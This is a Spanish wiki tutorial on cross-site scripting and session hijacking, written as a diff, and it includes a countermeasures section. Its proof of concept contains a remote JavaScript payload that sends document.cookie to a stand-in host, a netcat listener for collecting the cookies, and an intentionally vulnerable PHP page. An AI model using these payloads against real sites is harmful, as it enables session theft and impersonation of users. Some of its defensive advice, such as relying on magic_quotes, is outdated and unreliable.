@@ -1,0 +1,71 @@
+Cross Server Scripting es la posibilidad de que una página [http://www.formatoweb.com.ar/blog/2007/10/10/ataques-xss-el-peligro-de-hacer-echo-get-var/ incorpore código JS] de otro servidor por indicación de un usuario malintencionado, y no diseñado por el desarrollador.
+
+El interés de esta técnica para este usuario podría ser:
+*el robo de las cookies de los usuarios legítimos para suplantarles (si el JS usa document.cookie)
+*la redirección a otros sitios para suplantar el site (si el JS usa window.location)
+
+El navegador expone a la página web todas las cookies almacenadas '''por este host''' a través de la propiedad ''document.cookie'', salvo que el servidor indique que la cookie es HttpOnly.
+
+Las cookies las ofrece el servidor en el header '''Set-Cookie:''' de la respuesta (response), y el navegador cliente las presenta al servidor en las peticiones (request), a través del encabezado '''Cookie:'''. El navegador cliente [http://archive.netbsd.se/?ml=webappsec&a=2004-12&t=531582 sólo presenta las cookies] si la URL solicitada está en el mismo host y puerto que la que visualiza actualmente (caso de Firefox) o si la URL solicitada está en el mismo host (caso de la familia IExplorer). Ver RFC-2965.
+
+Habitualmente no se puede meter JS directo, ya que incorpora comillas simples o dobles y gracias a magic_quotes_gpc son filtradas y anulan el efecto. Lo que se hace es emplear un tag HTML que permita la [http://ha.ckers.org/xss.html inclusión de JS remoto] (atributo ''src''). Nosotros metemos:
+<pre>
+ <script src=http://host/kk.js></script>
+</pre>
+...donde kk.js es el código a ejecutar:
+ document.write("<iframe style='display: none;' src='http://host:9000/k?k="+document.cookie+"'></iframe>");
+ window.location='http://fake.inc/';
+
+Cuando el host falso y el que envía la cookie son el mismo, el navegador envía el encabezado ''Cookie'' sin problema. Veamos cómo gracias a este encabezado robamos la cookie, sin JS externo. El resultado de robar la cookie de [[Sesiones|sesión]] del cliente es poder utilizarla nosotros para suplantarle y loguearnos con sus credenciales.
+
+== Prueba de concepto ==
+Para esta prueba se necesitan dos navegadores distintos (preferiblemente en máquinas distintas/virtuales), un servidor web legítimo y una shell.
+
+Valiéndonos de que cualquier atributo src puede cargar contenido de otro host; este será el método para llamar desde una página a nuestro servidor malintencionado.
+
+Incluiremos un tag HTML invisible cuyo src apunte a nuestro ladrón de sesiones. Pueden valer:
+<pre>
+ <img src=http://host:9000 style=display:none;>
+</pre>
+
+Por el lado del servidor prepararemos un mini webserver, que ofrecerá una respuesta valida para no colgar al cliente y recogerá la cookie de sesión válida.
+ echo "HTTP/1.1 204 No Content\r\n\r\n" | nc -l -p 9000 -q 1
+
+Preparo en el servidor web legítimo este script:
+<pre>
+<?
+session_start();
+
+if ($_GET['msg']) $_SESSION['msg'] = $_GET['msg'];
+
+print $_SESSION['msg'];
+
+?>
+
+<img src=http://10.0.0.1:9000 style=display:none>
+</pre>
+Desde el navegador web del usuario legítimo, cargamos la página con ?msg=Hola soy el bueno. y la recargamos sin el parámetro GET. El resultado es simular que el usuario se ha autenticado y se le presenta una página especial. Observar en la shell petición del navegador legítimo.
+
+A continuación, abrir desde el navegador malintencionado la misma URL. No estamos autenticados, no tenemos el mensaje. Es ahora cuando nos valemos de webdeveloper para copiar el valor de PHPSESSID en la cookie que tenemos por haber visitado la página, volvemos a pedir la misma URL. Sorpresa, estamos dentro.
+
+*http://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html
+
+== Contramedidas ==
+Por lo pronto, debe intensificarse la validación en la entrada del usuario. Nunca mostrar un parámetro GET y POST que recibamos del cliente sin validarlo antes. Tampoco mostrar un registro de la base de datos que fue introducido por el cliente en GET/POST: es el mismo caso pero de efecto ''más lento'' (no se manifiesta inmediatamente en el request sino cuando ese registro salga).
+
+Filtrando los caracteres < y > y sustituirlos por los equivalentes HTML...
+ $v = ereg_replace('<', '&amp;lt;', $v);
+ $v = ereg_replace('>', '&amp;gt;', $v);
+
+...sería una buena ayuda, pero chocaría con los rich editors.
+
+Activar siempre magic_quotes_gpc, para evitar que el usuario nos envíe cadenas con comillas simples o dobles.
+
+=== HttpOnly ===
+Gracias a la directiva de PHP ''session.cookie_httponly = On'', el servidor incluye automáticamente en las cabeceras ''Set-Cookie:'' el texto HttpOnly. Este flag indica al navegador que no publique esta cookie en la propiedad document.cookie .
+
+La directiva puede indicarse tanto en .htaccess como en php.ini .
+
+Por desgracia, pese a que ocultemos todas las cookies y no se publiquen en document.cookie, cualquier petición desde una página incluirá al menos la cookie de sesión (si se pide al mismo servidor). Sólo mitigaríamos parte del primer problema.
+
+*http://ilia.ws/archives/121-httpOnly-cookie-flag-support-in-PHP-5.2.html
